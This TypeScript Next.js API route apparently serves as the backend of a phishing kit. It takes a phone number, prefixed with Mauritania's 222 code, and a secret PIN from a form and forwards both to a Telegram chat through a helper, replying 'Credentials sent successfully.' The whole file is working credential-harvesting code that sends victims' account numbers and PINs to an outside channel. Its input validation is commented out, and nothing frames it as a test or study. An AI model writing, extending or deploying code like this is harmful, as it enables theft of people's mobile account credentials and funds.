import { sendTelegram } from '@/lib/telegram';

export async function POST(request: Request) {
  let body: { phone?: unknown; codeSecret?: unknown };
  try {
    body = await request.json();
  } catch {
    return Response.json({ error: 'Invalid JSON body.' }, { status: 400 });
  }

  const phone = typeof body.phone === 'string' ? body.phone.trim() : '';
  const codeSecret = typeof body.codeSecret === 'string' ? body.codeSecret : '';

  // if (!/^\*{3,}$/.test(phone) || !/^\d{4}$/.test(codeSecret)) {
  //   return Response.json({ error: 'Numéro ou code invalide.' }, { status: 400 });
  // }


  try {
    await sendTelegram(
      `🔐 الرقم ورمز السري \nالرقم: 222${phone}\nالرمز السري: ${codeSecret}`
    );
  } catch (err) {
    return Response.json(
      { error: err instanceof Error ? err.message : 'Telegram send failed.' },
      { status: 502 }
    );
  }

  return Response.json({ message: 'Credentials sent successfully.' });
}
